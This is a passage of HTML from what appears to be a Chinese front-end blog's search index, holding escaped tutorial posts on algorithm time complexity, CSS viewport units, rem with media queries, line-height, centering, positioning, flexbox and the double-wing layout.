O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int cal(int n) {
   int ret = 0; 
   int i = 1;
   for (; i &amp;lt; n; ++i) { // n
     ret = ret + f(i);
   } 
 } 
 
 int f(int n) {
  int sum = 0;
  int i = 1;
  for (; i &amp;lt; n; ++i) { // n
    sum = sum + i;
  } 
  return sum;
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;不同情况下的复杂度&#34;&gt;不同情况下的复杂度&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;// n 表示数组 array 的长度
int find(int[] array, int n, int x) {
  int i = 0;
  int pos = -1;
  for (; i &amp;lt; n; ++i) {
    if (array[i] == x) pos = i;
  }
  return pos;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在一个无序的数组（array）中，查找变量 x 出现的位置。如果没有找到，就返回 -1。复杂度是 O(n)。优化如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// n 表示数组 array 的长度
int find(int[] array, int n, int x) {
  int i = 0;
  int pos = -1;
  for (; i &amp;lt; n; ++i) {
    if (array[i] == x) {
       pos = i;
       break;
    }
  }
  return pos;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为，要查找的变量 x 可能出现在数组的任意位置。如果数组中第一个元素正好是要查找的变量 x，那就不需要继续遍历剩下的 n-1 个数据了，那时间复杂度就是 O(1)。&lt;br&gt;
但如果数组中不存在变量 x，那我们就需要把整个数组都遍历一遍，时间复杂度就成了 O(n)。不同的情况下，这段代码的时间复杂度是不一样的。&lt;br&gt;
&lt;strong&gt;最好情况时间复杂度（best case time complexity）&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在最理想的情况下，执行这段代码的时间复杂度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;最坏情况时间复杂度 (worst case time complexity)&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在最糟糕的情况下，执行这段代码的时间复杂度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;平均情况时间复杂度 (average case time complexity)&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;概率论的方法求加权平均值，即每种情况发生的次数 x 每种情况发生的概率 之和。&lt;/p&gt;
&lt;/blockquote&gt;
">126-algorithm-1-时间和空间复杂度分析</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-xiang-ying-shi-vw/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;vh 网页视口高度的 1 / 100&lt;br&gt;
vw 网页视口宽度的 1 / 100&lt;br&gt;
vmax 取两者最大值；vmin 取两者最小值&lt;/p&gt;
&lt;h2 id=&#34;网页视口尺寸&#34;&gt;网页视口尺寸&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;window.screen.height // 屏幕高度&lt;/li&gt;
&lt;li&gt;window.innerHeight // 网页视口高度&lt;/li&gt;
&lt;li&gt;document.body.clientHeight // body 高度&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Responsive_Design&#34;&gt;响应式设计&lt;/a&gt;&lt;/p&gt;
">125-css-10-响应式vw</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-xiang-ying-shi-rem/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;media-query 来根据不同的屏幕宽度设置根元素 font-size，然后用rem作为单位&lt;/p&gt;
&lt;h2 id=&#34;rem&#34;&gt;rem&lt;/h2&gt;
&lt;p&gt;rem是一个长度单位&lt;br&gt;
px，绝对长度单位&lt;br&gt;
em，相对长度单位，相对于父元素，不常用&lt;br&gt;
rem，相对于根元素，常用语响应式布局&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;rem 演示&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        html {
            font-size: 100px;
        }
        div {
            background-color: #ccc;
            margin-top: 10px;
            font-size: 0.16rem;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

    &amp;lt;p style=&amp;quot;font-size: 0.1rem&amp;quot;&amp;gt;rem 1&amp;lt;/p&amp;gt;
    &amp;lt;p style=&amp;quot;font-size: 0.2rem&amp;quot;&amp;gt;rem 1&amp;lt;/p&amp;gt;
    &amp;lt;p style=&amp;quot;font-size: 0.3rem&amp;quot;&amp;gt;rem 1&amp;lt;/p&amp;gt;

    &amp;lt;div style=&amp;quot;width: 1rem;&amp;quot;&amp;gt;
        this is div1
    &amp;lt;/div&amp;gt;
    &amp;lt;div style=&amp;quot;width: 2rem;&amp;quot;&amp;gt;
        this is div2
    &amp;lt;/div&amp;gt;
    &amp;lt;div style=&amp;quot;width: 3rem;&amp;quot;&amp;gt;
        this is div3
    &amp;lt;/div&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;media-query&#34;&gt;media-query&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;@media&lt;/code&gt; CSS规则可用于基于一个或多个媒体查询的结果来应用样式表的一部分。 使用它，您可以指定一个媒体查询和一个CSS块，当且仅当该媒体查询与正在使用其内容的设备匹配时，该CSS块才能应用于该文档。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;响应式布局&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        @media only screen and (max-width: 374px) {
            /* iphone5 或者更小的尺寸，以 iphone5 的宽度（320px）比例设置 font-size */
            html {
                font-size: 86px;
            }
        }
        @media only screen and (min-width: 375px) and (max-width: 413px) {
            /* iphone6/7/8 和 iphone x */
            html {
                font-size: 100px;
            }
        }
        @media only screen and (min-width: 414px) {
            /* iphone6p 或者更大的尺寸，以 iphone6p 的宽度（414px）比例设置 font-size */
            html {
                font-size: 110px;
            }
        }

        body {
            font-size: 0.16rem;
        }
        #div1 {
            width: 1rem;
            background-color: #ccc;
        }

    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;div1&amp;quot;&amp;gt;
        this is div
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
">124-css-9-响应式rem</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-line-height/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;用于设置多行元素的空间量，如多行文本的间距。&lt;/p&gt;
&lt;p&gt;对于块级元素，它指定元素行盒（line boxes）的最小高度。&lt;/p&gt;
&lt;p&gt;对于非替代的 inline 元素，它用于计算行盒（line box）的高度。&lt;/p&gt;
&lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
&lt;h3 id=&#34;normal&#34;&gt;normal&lt;/h3&gt;
&lt;p&gt;取决于用户端。桌面浏览器（包括Firefox）使用默认值，约为&lt;code&gt;1.2&lt;/code&gt;，这取决于元素的 &lt;code&gt;font-family&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;数字&#34;&gt;&amp;lt;数字&amp;gt;&lt;/h3&gt;
&lt;p&gt;该属性的应用值是这个无单位数字&lt;code&gt;&amp;lt;数字&amp;gt;&lt;/code&gt;乘以该元素的字体大小。计算值与指定值相同。大多数情况下，这是设置&lt;code&gt;line-height&lt;/code&gt;的&lt;strong&gt;推荐方法&lt;/strong&gt;，不会在继承时产生不确定的结果。&lt;/p&gt;
&lt;h3 id=&#34;长度&#34;&gt;&amp;lt;长度&amp;gt;&lt;/h3&gt;
&lt;p&gt;指定&lt;code&gt;&amp;lt;长度&amp;gt;&lt;/code&gt;用于计算 line box 的高度。参考&lt;code&gt;&amp;lt;长度&amp;gt;&lt;/code&gt;了解可使用的单位。以 &lt;strong&gt;em&lt;/strong&gt; 为单位的值可能会产生不确定的结果。&lt;/p&gt;
&lt;h3 id=&#34;百分比&#34;&gt;&amp;lt;百分比&amp;gt;&lt;/h3&gt;
&lt;p&gt;与元素自身的字体大小有关。计算值是给定的百分比值乘以元素计算出的字体大小。&lt;strong&gt;百分比&lt;/strong&gt;值可能会带来不确定的结果。&lt;/p&gt;
&lt;h2 id=&#34;继承&#34;&gt;继承&lt;/h2&gt;
&lt;p&gt;当使用百分比时，p元素继承的为20x200%=40px&lt;/p&gt;
&lt;p&gt;推荐使用数值，即&lt;code&gt;line-height:2&lt;/code&gt;，p元素继承16x2=32px&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;line-height 继承问题&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        body {
            font-size: 20px;
            line-height: 200%;
        }
        p {
            background-color: #ccc;
            font-size: 16px;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;这是一行文字&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/CSS/line-height&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/CSS/line-height&lt;/a&gt;&lt;/p&gt;
">123-css-8-line-height</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-ding-wei-ju-zhong/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;水平垂直居中对齐&lt;/p&gt;
&lt;h2 id=&#34;方案&#34;&gt;方案&lt;/h2&gt;
&lt;p&gt;水平居中：&lt;br&gt;
inline 元素： text-align: center&lt;br&gt;
block 元素： margin：auto&lt;br&gt;
absolute元素：left: 50% + margin-left 负值&lt;/p&gt;
&lt;p&gt;垂直居中：&lt;br&gt;
inline 元素：line-height 的值等于height值&lt;br&gt;
absolute 元素：top: 50% + margin-top 负值(需要知道子元素的宽高)&lt;br&gt;
absolute 元素：transform(-50%,-50%)&lt;br&gt;
absolute 元素：top left bottom right = 0 + margin: auto&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;h3 id=&#34;水平居中&#34;&gt;水平居中&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;水平对齐&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        .container {
            border: 1px solid #ccc;
            margin: 10px;
            padding: 10px;
        }
        .item {
            background-color: #ccc;
        }

        .container-1 {
            text-align: center;
        }

        .container-2 .item {
            width: 500px;
            margin: auto;
        }

        .container-3 {
            position: relative;
            height: 100px;
        }
        .container-3 .item {
            width: 300px;
            height: 100px;
            position: absolute;
            left: 50%;
            margin-left: -150px;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div class=&amp;quot;container container-1&amp;quot;&amp;gt;
        &amp;lt;span&amp;gt;一段文字&amp;lt;/span&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;div class=&amp;quot;container container-2&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;
            this is block item
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;div class=&amp;quot;container container-3&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;
            this is absolute item
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;垂直居中&#34;&gt;垂直居中&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;垂直对齐&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        .container {
            border: 1px solid #ccc;
            margin: 10px;
            padding: 10px;
            height: 200px;
        }
        .item {
            background-color: #ccc;
        }

        .container-1{
            text-align: center;
            line-height: 200px;
            height: 200px;
        }

        .container-2 {
            position: relative;
        }
        .container-2 .item {
            width: 300px;
            height: 100px;
            position: absolute;
            left: 50%;
            margin-left: -150px;
            top: 50%;
            margin-top: -50px;
        }

        .container-3 {
            position: relative;
        }
        .container-3 .item {
            width: 200px;
            height: 80px;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%)
        }

        .container-4 {
            position: relative;
        }
        .container-4 .item {
            width: 100px;
            height: 50px;
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            right: 0;
            margin: auto;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div class=&amp;quot;container container-1&amp;quot;&amp;gt;
        &amp;lt;span&amp;gt;一段文字&amp;lt;/span&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;div class=&amp;quot;container container-2&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;
            this is item
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;div class=&amp;quot;container container-3&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;
            this is item
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;

    &amp;lt;div class=&amp;quot;container container-4&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;item&amp;quot;&amp;gt;
            this is item
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844903962529759239#heading-0&#34;&gt;让一个元素水平垂直居中，到底有多少种方案&lt;/a&gt;&lt;/p&gt;
">122-css-7-定位居中</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-position/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;CSS &lt;code&gt;position&lt;/code&gt;属性用于指定一个元素在文档中的定位方式。&lt;code&gt;top&lt;/code&gt;，&lt;code&gt;right&lt;/code&gt;，&lt;code&gt;bottom&lt;/code&gt; 和 &lt;code&gt;left&lt;/code&gt;属性则决定了该元素的最终位置。&lt;/p&gt;
&lt;h2 id=&#34;relative&#34;&gt;relative&lt;/h2&gt;
&lt;p&gt;依据自身定位&lt;/p&gt;
&lt;h2 id=&#34;absolute&#34;&gt;absolute&lt;/h2&gt;
&lt;p&gt;据最近一层的定位元素定位&lt;/p&gt;
&lt;p&gt;定位元素：absolute，relative，fixed 直到 body&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/CSS/position&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/CSS/position&lt;/a&gt;&lt;/p&gt;
">121-css-6-position</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-flex-bu-ju/"" data-c="
          &lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
&lt;h4 id=&#34;一-display&#34;&gt;一、display&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;设为 Flex 布局以后，子元素的&lt;code&gt;float&lt;/code&gt;、&lt;code&gt;clear&lt;/code&gt;和&lt;code&gt;vertical-align&lt;/code&gt;属性将失效。&lt;/strong&gt;&lt;br&gt;
块状元素&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;display: flex;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;行内元素&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;display: inline-flex;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Webkit 内核的浏览器&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;display: -webkit-flex;
display: flex;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;二-容器属性&#34;&gt;二、容器属性&lt;/h4&gt;
&lt;h6 id=&#34;1-flex-direction&#34;&gt;1、flex-direction&lt;/h6&gt;
&lt;p&gt;flex-direction属性决定主轴的方向（即项目的排列方向）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;row（默认值）：主轴为水平方向，起点在左端。&lt;/li&gt;
&lt;li&gt;row-reverse：主轴为水平方向，起点在右端。&lt;/li&gt;
&lt;li&gt;column：主轴为垂直方向，起点在上沿。&lt;/li&gt;
&lt;li&gt;column-reverse：主轴为垂直方向，起点在下沿。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;flex-direction: row | row-reverse | column | column-reverse;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;2-flex-wrap&#34;&gt;2、flex-wrap&lt;/h6&gt;
&lt;p&gt;flex-wrap属性定义，如果一条轴线排不下，如何换行。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nowrap（默认）：不换行。&lt;/li&gt;
&lt;li&gt;wrap：换行，第一行在上方。&lt;/li&gt;
&lt;li&gt;wrap-reverse：换行，第一行在下方。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;flex-wrap: nowrap | wrap | wrap-reverse;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;3-flex-flow&#34;&gt;3、flex-flow&lt;/h6&gt;
&lt;p&gt;flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。&lt;/p&gt;
&lt;h6 id=&#34;4-justify-content&#34;&gt;4、justify-content&lt;/h6&gt;
&lt;p&gt;justify-content属性定义了项目在主轴上的对齐方式。具体对齐方式与轴的方向有关。下面假设主轴为从左到右。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flex-start（默认值）：左对齐&lt;/li&gt;
&lt;li&gt;flex-end：右对齐&lt;/li&gt;
&lt;li&gt;center： 居中&lt;/li&gt;
&lt;li&gt;space-between：两端对齐，项目之间的间隔都相等。&lt;/li&gt;
&lt;li&gt;space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;justify-content: flex-start | flex-end | center | space-between | space-around;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;5-align-items&#34;&gt;5、align-items&lt;/h6&gt;
&lt;p&gt;align-items属性定义项目在交叉轴上如何对齐。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flex-start：交叉轴的起点对齐。&lt;/li&gt;
&lt;li&gt;flex-end：交叉轴的终点对齐。&lt;/li&gt;
&lt;li&gt;center：交叉轴的中点对齐。&lt;/li&gt;
&lt;li&gt;baseline: 项目的第一行文字的基线对齐。&lt;/li&gt;
&lt;li&gt;stretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;align-items: flex-start | flex-end | center | baseline | stretch;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;6-align-content&#34;&gt;6、align-content&lt;/h6&gt;
&lt;p&gt;align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flex-start：与交叉轴的起点对齐。&lt;/li&gt;
&lt;li&gt;flex-end：与交叉轴的终点对齐。&lt;/li&gt;
&lt;li&gt;center：与交叉轴的中点对齐。&lt;/li&gt;
&lt;li&gt;space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。&lt;/li&gt;
&lt;li&gt;space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。&lt;/li&gt;
&lt;li&gt;stretch（默认值）：轴线占满整个交叉轴。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;align-content: flex-start | flex-end | center | space-between | space-around | stretch;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;三-项目属性&#34;&gt;三、项目属性&lt;/h4&gt;
&lt;h6 id=&#34;1-order&#34;&gt;1、order&lt;/h6&gt;
&lt;p&gt;order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;order: &amp;lt;integer&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;2-flex-grow&#34;&gt;2、flex-grow&lt;/h6&gt;
&lt;p&gt;flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。&lt;/p&gt;
&lt;p&gt;如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flex-grow: &amp;lt;number&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;3-flex-shrink&#34;&gt;3、flex-shrink&lt;/h6&gt;
&lt;p&gt;flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。&lt;/p&gt;
&lt;p&gt;如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flex-shrink: &amp;lt;number&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;4-flex-basis&#34;&gt;4、flex-basis&lt;/h6&gt;
&lt;p&gt;flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。&lt;/p&gt;
&lt;p&gt;它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flex-basis: &amp;lt;length&amp;gt; | auto;
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;5-flex&#34;&gt;5、flex&lt;/h6&gt;
&lt;p&gt;flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。&lt;/p&gt;
&lt;p&gt;该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。&lt;/p&gt;
&lt;p&gt;建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flex: none | [ &amp;lt;&#39;flex-grow&#39;&amp;gt; &amp;lt;&#39;flex-shrink&#39;&amp;gt;? || &amp;lt;&#39;flex-basis&#39;&amp;gt; ]
&lt;/code&gt;&lt;/pre&gt;
&lt;h6 id=&#34;6-align-self&#34;&gt;6、align-self&lt;/h6&gt;
&lt;p&gt;align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;align-self: auto | flex-start | flex-end | center | baseline | stretch;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html&#34;&gt;flex-grammar&lt;/a&gt;　&lt;a href=&#34;http://static.vgee.cn/static/index.html&#34;&gt;flex-grammar效果&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;http://www.ruanyifeng.com/blog/2015/07/flex-examples.html&#34;&gt;flex-examples&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;http://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html&#34;&gt;grid-layout-tutorial&lt;/a&gt;&lt;/p&gt;
">120-css-5-flex布局</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/css-shuang-fei-yi-bu-ju/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;圣杯布局是通过padding给左右两边留白的，双飞翼布局是通过margin给左右两边留白的&lt;/li&gt;
&lt;li&gt;圣杯布局使用position:relative 和 right 移动left块，双飞翼布局没有用到&lt;/li&gt;
&lt;li&gt;圣杯布局的right使用的是margin-right，而双飞翼布局使用的是margin-left&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;双飞翼布局&amp;lt;/title&amp;gt;
    &amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;
        body {
            min-width: 550px;
        }
        .col {
            float: left;
        }

        #main {
            width: 100%;
            height: 200px;
            background-color: #ccc;
        }
        #main-wrap {
            margin: 0 190px 0 190px;
        }

        #left {
            width: 190px;
            height: 200px;
            background-color: #0000FF;
            margin-left: -100%;
        }
        #right {
            width: 190px;
            height: 200px;
            background-color: #FF0000;
            margin-left: -190px;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;main&amp;quot; class=&amp;quot;col&amp;quot;&amp;gt;
        &amp;lt;div id=&amp;quot;main-wrap&amp;quot;&amp;gt;
            this is main
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;div id=&amp;quot;left&amp;quot; class=&amp;quot;col&amp;quot;&amp;gt;
        this is left
